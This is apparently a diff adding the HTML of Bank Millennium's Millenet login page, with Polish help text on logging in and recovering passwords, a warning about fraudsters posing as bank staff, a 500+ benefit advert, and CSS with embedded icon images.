+                                                                <p>Podczas kolejnego logowania system poprosi Cię o podanie MilleKodu, H@sła 1, dwóch wybranych znaków z identyfikatora oraz wprowadzenia H@sła SMS.</p>
+                                                                <p>
+                                                                    <b>MilleKod</b> to Twój 8-cyfrowy login do konta. Znajdziesz go w umowie otrzymanej przy zakładaniu konta w Banku Millennium.
+                                                                </p>
+                                                                <p>
+                                                                    <b>H@sło 1</b>, czyli ustalone przez Ciebie 8-cyfrowe hasło do logowania do bankowości internetowej i telefonicznej. H@sło 1 możesz zmienić w Millenecie w zakładce
+                                                                    <b>Ustawienia bezpieczeństwa</b>. Pamiętaj, że powinno być kombinacją różnych cyfr i być trudne do odgadnięcia dla innych.
+                                                                </p>
+                                                                <p>
+                                                                    <b>Identyfikator</b> to np. Twój PESEL, numer dowodu osobistego lub paszportu. Jeśli logujesz się do konta firmowego, może to być również NIP lub REGON. System nigdy nie prosi o podanie więcej niż dwóch znaków z wybranego identyfikatora.
+                                                                </p>
+                                                                <p>
+                                                                    <b>H@sło SMS</b> – 6-cyfrowe hasło przesyłane w wiadomości SMS na zdefiniowany w systemie Banku numer telefonu.
+                                                                </p>
+                                                            </dd>
+                                                            <input id="helpInfo--6" type="checkbox">
+                                                            <dt>
+                                                                <label for="helpInfo--6">Problem z H@słem 1</label>
+                                                            </dt>
+                                                            <dd>
+                                                                <p>Nie pamiętasz lub masz zablokowane H@sło 1 do logowania? Masz trzy możliwości:</p>
+                                                                <ol>
+                                                                    <li>Samodzielnie odblokuj hasło po udzieleniu prawidłowych odpowiedzi na 5 pytań dot. Twojego konta i usług w Banku Millennium. Kliknij poniżej „Zmień”.</li>
+                                                                    <li>Odwiedź najbliższą placówkę Banku Millennium i odbierz nowe H@sło 1 w bezpiecznej kopercie.</li>
+                                                                    <li>Jeśli masz aktywną usługę H@seł SMS, możesz nadać nowe H@sło 1 dzwoniąc na Infolinię TeleMillennium:
+                                                                        <br>
+                                                                        +48 22 598 40 50
+                                                                    </li>
+                                                                </ol>
+                                                            </dd>
+                                                            <input id="helpInfo--7" type="checkbox">
+                                                            <dt>
+                                                                <label for="helpInfo--7">Nie otrzymałem H@sła SMS</label>
+                                                            </dt>
+                                                            <dd>
+                                                                <p>Po 2 minutach możesz spróbować wygenerować nowy kod. Jeśli nadal nie otrzymasz SMS-a, to:</p>
+                                                                <ul>
+                                                                    <li>odwiedź najbliższą placówkę Banku Millennium
+                                                                        <br>
+                                                                        lub
+                                                                    </li>
+                                                                    <li>zadzwoń na infolinię TeleMillennium:
+                                                                        <br>
+                                                                        +48 22 598 40 50
+                                                                    </li>
+                                                                </ul>
+                                                            </dd>
+                                                            <input id="helpInfo--8" type="checkbox">
+                                                            <dt>
+                                                                <label for="helpInfo--8">Kontakt z Bankiem</label>
+                                                            </dt>
+                                                            <dd>
+                                                                <p>Jeśli masz inne problemy lub wątpliwości związane z logowaniem do bankowości internetowej Millenet, skontaktuj się z nami dzwoniąc pod numer:
+                                                                    <b>+48 22 598 40 50</b> lub odwiedź najbliższą placówkę Banku.
+                                                                </p>
+                                                            </dd>
+                                                        </dl>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <script type="text/javascript">
+                                            $(document).ready(function () {
+                                                $('#login-problems-help-container').Retail_Login_LoginProblemsHelp({
+                                                    loginHelpProcess: 'None',
+                                                    millecodeRetrievalAvailable: 'True'
+                                                });
+                                                $('#login-problems-help-container').Retail_Login_ResetPasswordAuthenticationSms({});
+                                                $('#login-problems-help-container').LoginProblemsWebTrends({});
+                                            });
+                                        </script>
+                                    </div>
+                                    <div id="LoaderDiv" style="display: none;">
+                                        <div aria-valuetext="" class="MNLoading MillenniumLoaderAbsolute Hidden IsModal IsGlobal" data-widget="true" id="waitResetMessage" role="progressbar">
+                                            <div class="ModalLayer"></div>
+                                            <div class="Image" id="waitResetMessage_image"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <a href="javascript:void(0)" tabindex="0" class="CloseButton">
+                                    <span class="aria-hide aria-hide-close">Zamknij</span>
+                                </a>
+                            </div>
+                            <div class="Footer" id="_Footer">
+                                <div>
+                                    <div class="KeyIconParent">
+                                        <div class="keyIcon"></div>
+                                    </div>
+                                    <div class="MNButtonsBarParent">
+                                        <div class="MNButtonsBar" data-widget="true" id="ui-id-7">
+                                            <ul class="RightButtons">
+                                                <li>
+                                                    <a class="MNButton MNCommand btn btn-link PrimaryRounded btn-default" data-widget="true" href="javascript:void(0)" onclick="$(&#39;#login-problems-help-container&#39;).Retail_Login_LoginProblemsHelp(&#39;showResetInfoBox&#39;);" id="ui-id-8">
+                                                        <div class="Content">Zmień</div>
+                                                    </a>
+                                                </li>
+                                            </ul>
+                                            <div class="MessagePanel">
+                                                <p class="MNText ConfirmMessage Standard Text" data-dateformat="yy-mm-dd">Nie pamiętasz hasła?</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MNInfoBox MNContainer ResetPassInfoBox RoundedBoxInfo" data-role="alert" style="display: none; display: none;">
+                                        <div class="BorderLine"></div>
+                                        <div class="   Wrapper">
+                                            <div class="WrapperRoundedBox">
+                                                <div class="Header clearfix panel-heading">
+                                                    <h3 class="panel-title">Chcesz zmienić hasło? Wprowadź swój
+                                                        <b>MilleKod</b>, kliknij
+                                                        <b>DALEJ</b> i wybierz opcję Zmiana hasła.
+                                                    </h3>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="MNModalPanel MNBalloonClosable MNBalloon MNContainer reset-password-final-balloon NotificationSuccess WhiteTransparency NoTail" data-allowscrollwhenopen="true" data-appearance="NotificationSuccess" data-closeonoverlayclick="false" data-dontadjustappearance="false" data-initiallyvisible="false" data-isnotdraggable="true" data-minimumheight="0" data-template-abandonprocesscontent="Próba zresetowania hasła została przerwana" data-template-abandonprocesstitle="Czy na pewno chcesz przerwać proces odzyskiwania hasła do Millenetu?" data-widget="true" id="reset-password-final-balloon" style="display: none; display: none;">
+                        <div class="ModalLayer" style="display: none;"></div>
+                        <div class="ColorShadow Balloon" role="dialog" aria-describedby="reset-password-final-balloon_Content" tabindex="0" style="margin-left: -4000px;">
+                            <div class="Header row" id="reset-password-final-balloon_Header">
+                                <div class="IconSuccess FullHeight Icon mille_font col-sm-2"></div>
+                                <p class="WordWrap col-sm-10"></p>
+                            </div>
+                            <div class="Tail None"></div>
+                            <div class="Content" id="reset-password-final-balloon_Content">
+                                <div></div>
+                                <a href="javascript:void(0)" tabindex="0" class="CloseButton">
+                                    <span class="aria-hide aria-hide-close">Zamknij</span>
+                                </a>
+                            </div>
+                            <div class="Footer" id="reset-password-final-balloon_Footer">
+                                <div class="reset-footer">
+                                    <a class="MNHLink MNCommand PlainNoDecoration" data-widget="true" href="javascript:void(0)" id="Ok" onclick="$(&#39;#login-problems-help-container&#39;).Retail_Login_LoginProblemsHelp(&#39;abandonResetPasswordProcess&#39;);">Tak</a>
+                                    <a class="MNHLink MNCommand PlainNoDecoration" data-widget="true" href="javascript:void(0)" id="Cancel" onclick="$(&#39;#login-problems-help-container&#39;).Retail_Login_LoginProblemsHelp( &#39;closeAbandonNotification&#39; )">Nie</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="MNModalPanel MNBalloonClosable MNBalloon MNContainer reset-password-final-balloon-security NotificationSuccess WhiteTransparency NoTail" data-allowscrollwhenopen="true" data-appearance="NotificationSuccess" data-closeonoverlayclick="false" data-dontadjustappearance="false" data-initiallyvisible="false" data-isnotdraggable="true" data-minimumheight="0" data-widget="true" id="reset-password-final-balloon-security" style="display: none; display: none;">
+                        <div class="ModalLayer" style="display: none;"></div>
+                        <div class="ColorShadow Balloon" role="dialog" aria-describedby="reset-password-final-balloon-security_Content" tabindex="0" style="margin-left: -4000px;">
+                            <div class="Header row" id="reset-password-final-balloon-security_Header">
+                                <div class="IconSuccess FullHeight Icon mille_font col-sm-2"></div>
+                                <p class="WordWrap col-sm-10"></p>
+                            </div>
+                            <div class="Tail None"></div>
+                            <div class="Content" id="reset-password-final-balloon-security_Content">
+                                <div></div>
+                                <a href="javascript:void(0)" tabindex="0" class="CloseButton">
+                                    <span class="aria-hide aria-hide-close">Zamknij</span>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="MNModalPanel MNBalloonClosable MNBalloon MNContainer retrieval-final-balloon NotificationSuccess WhiteTransparency NoTail" data-allowscrollwhenopen="true" data-appearance="NotificationSuccess" data-closeonoverlayclick="false" data-dontadjustappearance="false" data-initiallyvisible="false" data-isnotdraggable="true" data-minimumheight="0" data-template-abandonprocesscontentretrieval="Próba odzyskiwania Millekodu hasła została przerwana" data-template-abandonprocesstitleretrieval="Czy na pewno chcesz przerwać proces odzyskiwania MilleKodu?" data-widget="true" id="retrieval-final-balloon" style="display: none; display: none;">
+                        <div class="ModalLayer" style="display: none;"></div>
+                        <div class="ColorShadow Balloon" role="dialog" aria-describedby="retrieval-final-balloon_Content" tabindex="0" style="margin-left: -4000px;">
+                            <div class="Header row" id="retrieval-final-balloon_Header">
+                                <div class="IconSuccess FullHeight Icon mille_font col-sm-2"></div>
+                                <p class="WordWrap col-sm-10"></p>
+                            </div>
+                            <div class="Tail None"></div>
+                            <div class="Content" id="retrieval-final-balloon_Content">
+                                <div></div>
+                                <a href="javascript:void(0)" tabindex="0" class="CloseButton">
+                                    <span class="aria-hide aria-hide-close">Zamknij</span>
+                                </a>
+                            </div>
+                            <div class="Footer" id="retrieval-final-balloon_Footer">
+                                <div class="retrieval-footer">
+                                    <a class="MNHLink MNCommand PlainNoDecoration" data-widget="true" href="javascript:void(0)" id="Ok" onclick="$(&#39;#login-problems-help-container&#39;).Retail_Login_LoginProblemsHelp(&#39;abandonResetPasswordProcess&#39;);">Tak</a>
+                                    <a class="MNHLink MNCommand PlainNoDecoration" data-widget="true" href="javascript:void(0)" id="Cancel" onclick="$(&#39;#login-problems-help-container&#39;).Retail_Login_LoginProblemsHelp( &#39;closeAbandonNotification&#39; )">Nie</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="news-right-side-container" style="display: block;">
+                <div id="news-container" class="news-container">
+                    <div class="MNInfoContent panel Plain Custom" data-name="LoginNews" data-uniqueid="a42c13ee37124b7aaea77b24ef0089e0" data-widget="true" id="ui-id-9">
+                        <div class="ci_custom ">
+                            <!--?xml version="1.0" encoding="utf-16"?-->
+                            <div style="margin:0px; padding:0px; border:0px;">
+                                <div class="MNTogglePanel MNContainer NotificationErrorWithArrow Collapsed" data-widget="true" id="ui-id-10" style="display: block;" data-headertext="Chwilowe utrudnienia w korzystaniu z Millenetu">
+                                    <div class="panel-title Header" wttrace="" wtrendsid="Chwilowe utrudnienia w korzystaniu z Millenetu">
+                                        <span class="Text">Chwilowe utrudnienia w korzystaniu z Millenetu</span>
+                                    </div>
+                                    <div aria-expanded="false" class="Body clearfix" style="display: none;">
+                                        <div class="content-news-container">
+                                            <p>Informujemy, że w Millenecie mogą występować chwilowe problemy komunikacyjne. Przepraszamy za wszelkie utrudnienia, pracujemy nad jak najszybszym przywróceniem pełnej funkcjonalności systemu.</p>
+                                        </div>
+                                        <style> .content-news-container a { color: white; color: inherit; } .content-news-container p, .content-news-container ul { margin-bottom: 10px; } </style>
+                                    </div>
+                                </div>
+                                <div class="MNTogglePanel MNContainer NotificationInfoWithArrow Collapsed" data-widget="true" id="News" style="display: block;" data-headertext="Oszuści podszywają się pod pracowników Banku Millennium lub brokerów! Bądź czujny i nie udostępniaj poufnych danych">
+                                    <div class="panel-title Header" wttrace="" wtrendsid="Oszuści podszywają się pod pracowników Banku Millennium lub brokerów! Bądź czujny i nie udostępniaj poufnych danych">
+                                        <span class="Text">Oszuści podszywają się pod pracowników Banku Millennium lub brokerów! Bądź czujny i nie udostępniaj poufnych danych</span>
+                                    </div>
+                                    <div aria-expanded="false" class="Body clearfix" style="display: none;">
+                                        <div class="content-news-container">
+                                            <p>Uważaj na oszustów podszywających się pod pracowników Banku Millennium lub brokerów promujących wyjątkowo korzystne inwestycje.</p>
+                                            <br>
+                                            <p>Zachowaj szczególną czujność w przypadku gdy:</p>
+                                            <ul>
+                                                <li>osoba dzwoniąca namawia Cię
+                                                    <b>do zainstalowania dodatkowego oprogramowania, zainstalowania aplikacji</b> lub
+                                                    <b>podania danych do logowania</b> do banku
+                                                </li>
+                                                <li>jesteś proszony
+                                                    <b>o podanie poufnych danych</b> (np. numeru PESEL, numeru swojej karty płatniczej, kodu CVV2/CVC2) lub
+                                                    <b>przesłanie zdjęcia czy skanu dowodu osobistego i karty płatniczej</b>
+                                                </li>
+                                                <li>doradca chce
+                                                    <b>wykonywać transakcje w Twoim imieniu</b> lub
+                                                    <b>zalogować się za Ciebie</b> do konta
+                                                </li>
+                                            </ul>
+                                            <p>Jeśli masz jakiekolwiek wątpliwości podczas rozmowy z osobą podającą się za konsultanta Banku,
+                                                <b>rozłącz się i skontaktuj się z nami</b> - napisz przez skrzynkę kontaktową lub zadzwoń na specjalną infolinię,
+                                                <b>22 598 44 44</b> (opłata zgodna z taryfą operatora).
+                                            </p>
+                                            <p>
+                                                <b>Loguj się do konta wyłącznie na stronie Banku,</b> a podczas logowania pamiętaj, że system nigdy nie wymaga podania pełnego numeru PESEL czy pełnego numeru dokumentu, a jedynie
+                                                <b>dwóch losowo wybranych znaków.</b>
+                                            </p>
+                                            <p>Więcej informacji na temat bezpiecznego bankowania znajdziesz
+                                                <a href="https://www.bankmillennium.pl/bankowosc-elektroniczna/millenet-dla-klientow-indywidualnych-biznes/bezpieczenstwo">tu&gt;</a>
+                                            </p>
+                                        </div>
+                                        <style> .content-news-container a { color: white; color: inherit; } .content-news-container p, .content-news-container ul { margin-bottom: 10px; } </style>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="movie-right-side-container" class="login-right-side-container">
+                <div class="video-player-modal"></div>
+                <div id="video-player-balloon-container" class="video-player-balloon-container">
+                    <div class="MNBalloonClosable MNBalloon MNContainer video-player-balloon FullTransparentButtonOnTop" data-appearance="FullTransparentButtonOnTop" data-close="$(&#39;.LoginPage&#39;).Website_LayoutLogin(&#39;hideVideoPlayer&#39;);" data-destinationelement="$(&#39;#&#39;).parent()" data-dontadjustappearance="false" data-initiallyvisible="false" data-isnotdraggable="true" data-minimumheight="0" data-widget="true" style="display: none; display: none;" id="ui-id-11">
+                        <div class="Balloon" role="dialog" aria-describedby="ui-id-11_Content" style="margin-left: -4000px;">
+                            <div class="Tail None"></div>
+                            <div class="Content" id="_Content">
+                                <div>
+                                    <div id="movie-container" class="movie-container embed-responsive embed-responsive-16by9">
+                                        <video id="videoPlayer" class="embed-responsive-item" controls="">
+                                            <source id="mp4Video" type="video/mp4">
+                                            <source id="webmVideo" type="video/webm">
+
+                                            #(Your browser does not support the video tag.)
+
+                                        </video>
+                                    </div>
+                                </div>
+                                <a href="javascript:void(0)" tabindex="0" class="CloseButton">
+                                    <span class="aria-hide aria-hide-close">Zamknij</span>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="main-info-content-container" class="login-right-side-container">
+                <div class="MNInfoContent main-info-content panel Plain Custom" data-name="LoginAdvert" data-uniqueid="Customized1" data-widget="true" id="main-info-content">
+                    <div class="ci_custom advert__con">
+                        <!--?xml version="1.0" encoding="utf-16"?-->
+                        <div style="margin:0px; padding:0px; border:0px;">
+                            <style>
+                                .login-advert-info-content .ci_custom, .ci_custom.advert__con { height: 100%; width: 100%; display: block; position: absolute; top: 0; left: 0; right: 0; bottom: 0; }
+                                .login-advert-info-content .ci_custom > div, .ci_custom.advert__con > div { width: 100%; height: 100%; }
+
+                                #advert { display: flex; height: 100%; align-items: center; padding-bottom: 60px;
+                                    background-image: url(/documents/560594/29508898/500plus_benefit_login_banner_HD.jpg/0fce7f15-c313-6e12-9fbe-3c39dd774157?t=1611902324713); background-repeat: no-repeat;
+                                    background-size: cover;
+                                    background-position: center;
+                                }
+                                #advert > .content { margin: 5px 13% 5px 13%; padding-bottom: 56px; }
+
+                                #advert > .content .title { color: #FFFFFF; font-family: Roboto; font-size: 36px; font-weight: bold; line-height: 43px; }
+                                #advert > .content .desc { margin: 25px 0 44px 0; }
+                                #advert > .content .desc p { margin-bottom: 10px; color: #FFFFFF;	font-family: Roboto; font-size: 15px; line-height: 21px;  }
+                                #advert > .content .desc p:last-child { margin-bottom: 0; }
+                                #advert > .content .button { display: inline-block; border: 2px solid #FFFFFF; color: #FFFFFF; font-family: Roboto; font-size: 14px; font-weight: bold; line-height: 23px; text-transform: uppercase; padding: 14px 20px 15px 19px; border-radius: 3px; }
+                                #advert > .content a.legal { background-color: rgba(46,46,46,0.6); padding: 12px 24px; border-radius: 200px; color: white; font-family: Roboto; font-size: 14px; line-height: 33px; margin-left: 25px; }
+                                #advert > .content a.legal:hover { text-decoration: none; }
+
+
+                                @media screen and (max-width: 1240px) {
+                                    #advert {
+                                        background-image: url(/documents/560594/29508898/500plus_benefit_login_banner_T.jpg/c25924a0-c3ff-a1e4-953f-3733470807c9?t=1611902325143); background-repeat: no-repeat;
+                                        background-size: cover;
+                                        background-position: center;
+                                    }
+
+                                    #advert > .content { margin: 5px 20% 5px 13%; padding-bottom: 56px; }
+                                    #advert > .content .title, #advert > .content .desc { width: 70%; }
+                                }
+                                @media screen and (max-width: 1100px) {
+                                    #advert > .content { margin: 25px 3% 25px 17%; padding-bottom: 56px; }
+                                }
+                                @media screen and (max-width: 767px) {
+                                    .ci_custom.advert__con { position:relative; }
+                                    #advert > .content { padding-bottom: 0; margin-top: 175px; }
+                                    #advert {
+                                        padding-bottom: 0;
+                                        border-radius: 10px 10px 0 0;
+                                        background-image: url(/documents/560594/29508898/500plus_benefit_login_banner_M.jpg/dd15d277-a2e4-2e8d-ed41-3c6b866e6e30?t=1611902324937);
+                                        background-size: auto 145px; background-repeat: no-repeat; background-position: top center;
+                                    }
+                                    #advert > .content  .title { color: #2E2E2E; font-family: Roboto; font-size: 13px; font-weight: bold; line-height: 20px; margin: 0 10px 10px; }
+                                    #advert > .content .desc { margin: 0 10px 10px; }
+                                    #advert > .content .desc p { color: #2E2E2E; font-family: Roboto; font-size: 13px; line-height: 20px; }
+                                    #advert > .content .button { color: #CF004E; font-family: Roboto; font-size: 13px; font-weight: bold; text-transform: unset; padding: 0; border: none; float: right; padding-bottom: 10px; margin-right: 10px;}
+                                    #advert > .content a.legal { color: black; background: none; margin: 0; padding: 0; padding-bottom: 10px; margin-left: 10px; font-size: 13px; font-weight: bold; line-height: 23px;}
+                                }
+                                /*
+                                 * advert__message -- browser
+                                 advert.advert__message
+                                 advert.advert__message > .content
+                                 */
+                                #advert.advert__message:before { content: ""; width: 100%; height: 100%; background: rgba(0,0,0,0.6); position: absolute; top: 0; left: 0; }
+                                #advert > .message, #advert.advert__message > .content { display: none; transition: transform 800ms; transform: translate(100vw, 0); }
+                                #advert.advert__message .message {  }
+                                #advert.advert__message > .message { width: 450px; display: inherit; background: white; width: auto; height: auto; position: relative; margin: 0 auto; padding: 60px 50px 50px; box-sizing: content-box; border-radius: 10px; font-family: 'Roboto'; text-align: center;  flex-direction: column; transform: translate(0, 0);}
+                                #advert.advert__message .message__close { color: black; font-size: 20px; line-height: 20px; position: absolute; top: 20px; right: 20px; text-decoration: none!important; cursor: pointer; }
+                                #advert.advert__message h3 { font-size: 28px; line-height: 30px; font-weight: 300; margin: 0 0 25px; }
+                                #advert.advert__message p { font-size: 14px; font-weight: 300; line-height: 1.5; }
+                                #advert.advert__message .button__con { text-align: center; width: 100%; margin: 20px 0 0; }
+                                #advert.advert__message .button__con .btn { background: #bd004f; border: 1px solid #bd004f; border-radius: 3px; color: #fff; min-width: 101px; height: 45px; text-shadow: none !important; line-height: 30px; text-transform: uppercase; font-weight: bold; letter-spacing: 1px; font-size: 14px; }
+                                #advert.advert__message .button__con .link { line-height: 30px; text-transform: uppercase; font-weight: bold; font-size: 14px; color: #bd004f; margin-left: 20px; text-decoration: none!important; cursor: pointer;}
+
+                                @media screen and (max-width: 1240px) {
+                                    #advert.advert__message > .message { width: 80%;  padding: 60px 30px 40px; }
+                                }
+                                @media screen and (max-width: 1024px) {
+                                    #advert.advert__message > .message { width: 70%; padding: 60px 20px 30px;}
+                                }
+                                @media screen and (max-width: 767px) {
+                                    #advert.advert__message:before { background: rgba(0,0,0,0.1); }
+                                    #advert.advert__message h3 { margin-bottom: 20px; }
+                                    #advert.advert__message .button__con { margin-top: 30px; }
+                                    #advert.advert__message .message { width: 100%;margin: 0px;padding: 40px 30px 30px; }
+                                    #advert.advert__message .button__con .link {display:none;}
+                                    #advert.advert__message .message__close  {display:none;}
+                                }
+                            </style>
+                            <div id="advert" class="">
+                                <div class="content">
+                                    <h2 class="title">Wnioskuj o 500+ bez kolejek i wizyt w urzędzie</h2>
+                                    <div class="desc">
+                                        <p>Już możesz złożyć w Millenecie wniosek Rodzina 500+ na nowy okres świadczeniowy</p>
+                                    </div>
+                                    <div class="buttons">
+                                        <a href="https://www.bankmillennium.pl/bankowosc-elektroniczna/millenet-dla-klientow-indywidualnych-biznes/rodzina-500-plus" class="button" target="_blank">Dowiedz się więcej</a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="mobile-main-info-content-container" class="visible-xs-block"></div>
+    <div class="footer-info-container">
+        <div class="footer-info-content">
+            <div class="MNInfoContent panel Plain Custom" data-name="LoginFooter" data-uniqueid="73c11642434541e299b1c5dbfeff39ea">
+                <div class="ci_custom ">
+                    <!--?xml version="1.0" encoding="utf-16"?-->
+                    <div style="margin:0px; padding:0px; border:0px;">
+                        <style>
+                            .footer-info-content, .footer-info-content > .MNInfoContent,.footer-info-content > .MNInfoContent > .ci_custom { height: 100%; }
+                            .footer-info-content > .MNInfoContent > .ci_custom > div { height:100%; }
+                            .footer-info-content footer { display: flex; align-items: center; justify-content: space-between; height: 100%; }
+                            .footer-info-content footer .phone { color: #2E2E2E; font-family: Roboto; font-size: 30px; font-weight: 300; line-height: 15px; margin: 0 50px; text-decoration: none; white-space: nowrap;}
+                            .footer-info-content footer ul { padding: 0; margin: 0 50px 0 0;  display: flex; list-style-type: none; align-items: center; }
+                            .footer-info-content footer ul > li { margin: 0 35px 0 0;}
+                            .footer-info-content footer ul > li > a { color: #2E2E2E; font-family: Roboto; font-size: 15px; line-height: 35px; text-decoration: none; padding-left: 40px; white-space: nowrap; }
+                            .footer-info-content footer ul > li > a:hover {color: #bd004f; text-decoration: none; }
+                            .footer-info-content footer .lock { background: url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMzUgMzUiIHdpZHRoPSIzNSIgaGVpZ2h0PSIzNSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLW1pdGVybGltaXQ9IjEuNDE0Ij4KICA8cGF0aCBmaWxsPSIjQkQwMDRGIiBkPSJNMjUuNyAxMS40NWMuMS0yLjUtLjgtNC45LTIuNC02LjgtMy4xLTMuMi04LjMtMy4yLTExLjYgMGwtLjEuMWMtMS42IDEuOC0yLjQgNC4yLTIuMyA2LjctMS45LjMtMy4zIDItMy4zIDMuOXYxMS43YzAgMy4xIDIuNSA1LjcgNS43IDUuN2gxMS43YzMuMSAwIDUuNy0yLjUgNS43LTUuN3YtMTEuN2MtLjEtMS45LTEuNS0zLjYtMy40LTMuOXpNMTMgNS45NWMyLjUtMi41IDYuNS0yLjUgOSAwIDEuMyAxLjUgMiAzLjUgMS45IDUuNUgxMS4xYy0uMS0yLjEuNi00IDEuOS01LjV6bTE0LjIgMjEuMWMwIDIuMS0xLjcgMy45LTMuOSAzLjlIMTEuN2MtMi4xIDAtMy45LTEuNy0zLjktMy45di0xMS43YzAtMS4yIDEtMi4yIDIuMi0yLjJoMTVjMS4yIDAgMi4yIDEgMi4yIDIuMnYxMS43eiIgZmlsbC1ydWxlPSJub256ZXJvIi8+CiAgPHBhdGggZmlsbD0iI0JEMDA0RiIgZD0iTTE3LjUgMTcuNzVjLTEuMyAwLTIuMyAxLTIuMyAyLjMgMCAuOS42IDEuOCAxLjQgMi4xdjIuOWMwIC41LjQuOS45LjlzLjktLjQuOS0uOXYtMi44YzEuMi0uNSAxLjgtMS44IDEuMy0zLS40LS45LTEuMi0xLjUtMi4yLTEuNXoiLz4KPC9zdmc+Cg==); background-repeat: no-repeat; background-position: left center; }
+                            .footer-info-content footer .map { background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNSIgaGVpZ2h0PSIzNSIgdmlld0JveD0iMCAwIDM1IDM1Ij4KICA8cGF0aCBmaWxsPSIjQkQwMDRGIiBkPSJNMTcuNiAxNy43bC0zLjQtNy45Yy0xLTIuNC0yLjUtMy40LTMuNy0zLjdDOS45IDYgOS4yIDYgOC42IDZjLjYgMCAxLjIuMiAxLjguNS45LjYgMS40IDEuOSAxLjIgMy43bC0xLjEgNy45Yy0uMSAxLS40IDIuNi0uNCAyLjZoMS41cy4xLTEuMi4yLTIuM2wxLTcuNyAzLjQgOC4xYy4zLjkuOSAxLjYgMS42IDIuMmw0LTEwLjMgMSA4LjZjLjEuNi4xIDEuNC4xIDEuNGgycy0uMi0xLS4zLTEuOUwyMy40IDEwYzAtLjQtLjEtMS4xLS4xLTEuMWgtMi40YzAgLjQtLjEuOC0uMyAxLjFsLTMgNy43eiIvPgogIDxwYXRoIGZpbGw9IiNCRDAwNEYiIGQ9Ik0xNyAyYy0xLjggMC0zLjYuNC01LjIgMS4xLS41LjItLjguOC0uNiAxLjMuMi41LjguNyAxLjMuNmguMWM1LjYtMi40IDEyLjEuMSAxNC41IDUuNy42IDEuMy45IDIuOC45IDQuMy0uMSAxLjctLjYgMy4zLTEuMyA0LjgtLjkgMS45LTIgMy43LTMuMyA1LjQtMS45IDIuNC00IDQuNi02LjQgNi40LTIuNC0xLjktNC42LTQuMS02LjUtNi42LTEuMi0xLjctMi4zLTMuNS0zLjItNS40LS44LTEuMy0xLjItMy0xLjMtNC42IDAtMi4zLjctNC41IDItNi4zLjMtLjUuMS0xLjEtLjQtMS40LS40LS4yLS45LS4xLTEuMi4yQzQuOCA5LjcgNCAxMi4zIDQgMTVjLjEgMiAuNiAzLjkgMS41IDUuNiAxIDIgMi4xIDMuOSAzLjQgNS43IDIuMSAyLjggNC41IDUuMiA3LjMgNy4zLjUuNCAxLjEuNCAxLjYgMCAyLjctMi4xIDUuMS00LjUgNy4yLTcuMiAxLjMtMS44IDIuNS0zLjcgMy40LTUuNy45LTEuOCAxLjQtMy43IDEuNi01LjcgMC03LjItNS44LTEzLTEzLTEzeiIvPgo8L3N2Zz4K); background-repeat: no-repeat; background-position: left center; }
+                            .footer-info-content footer .mail { background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzNSAzNSIgd2lkdGg9IjM1IiBoZWlnaHQ9IjM1Ij4KICAgIDxwYXRoIGZpbGw9IiNCRDAwNEYiIGQ9Ik0yOS4xIDcuM0g2LjVDNS4xIDcuMiA0IDguMyA0IDkuNnYxNS43YzAgMS4zIDEuMSAyLjQgMi40IDIuNGgyMi43YzEuMyAwIDIuNC0xLjEgMi40LTIuNFY5LjdjMC0xLjQtMS0yLjQtMi40LTIuNHptLjkgMThjMCAuNS0uNC45LS45LjlINi41Yy0uNSAwLS45LS40LS45LS45VjkuN2MwLS41LjQtLjkuOS0uOWgyMi42Yy41IDAgLjkuNC45Ljl2MTUuNnoiLz4KICAgIDxwYXRoIGZpbGw9IiNCRDAwNEYiIGQ9Ik0yNy43IDIyLjlsLTYuMy01LjIgNi4yLTUuNmMuMy0uMy4zLS44IDAtMS4xLS4zLS4yLS43LS4zLTEtLjFsLTguOSA4LTkuMS04LjJjLS4zLS4zLS44LS4zLTEuMSAwcy0uNC44LS4xIDEuMWwuMS4xLjIuMiA2LjQgNS43LTYuNCA1LjNjLS4zLjMtLjQuOC0uMSAxLjFzLjcuNCAxIC4xbDYuNi01LjQgMiAxLjhjLjMuMy43LjMgMSAwbDItMS44IDYuNCA1LjJjLjMuMy44LjIgMS4xLS4xLjQtLjQuMy0uOCAwLTEuMXoiLz4KPC9zdmc+Cg==); background-repeat: no-repeat; background-position: left center; }
+
+                            @media screen and (max-width: 1024px) {
+                                .footer-info-content footer ul { margin: 0; padding: 0; }
+                                .footer-info-content footer ul > li { margin: 0 10px 0 0; }
+                                .footer-info-content footer ul > li > a { padding-left: 32px; font-size: 14px; }
+                                .footer-info-content footer .phone { margin: 0 5px;  font-size: 26px; }
+                                .footer-info-content footer .lock, .footer-info-content footer .map, .footer-info-content footer .mail { background-size: 31px; }
+                            }
+                            @media screen and (max-width: 767px) {
+                                .footer-info-container { height: inherit; }
+                                .footer-info-content footer { display: block; margin: 30px; }
+                                .footer-info-content footer ul { margin: 0; display: block;  padding: 0; }
+                                .footer-info-content footer ul > li:not(:last-child) { margin: 0 0 30px 0; }
+                                .footer-info-content footer ul > li > a { padding-left: 40px; font-size: 15px; }
+                                .footer-info-content footer .phone { margin: 0 0 40px 0; display: block; font-size: 30px;}
+                                .footer-info-content footer .lock, .footer-info-content footer .map, .footer-info-content footer .mail { background-size: inherit; }
+                            }
+                        </style>
+                        <footer style="">
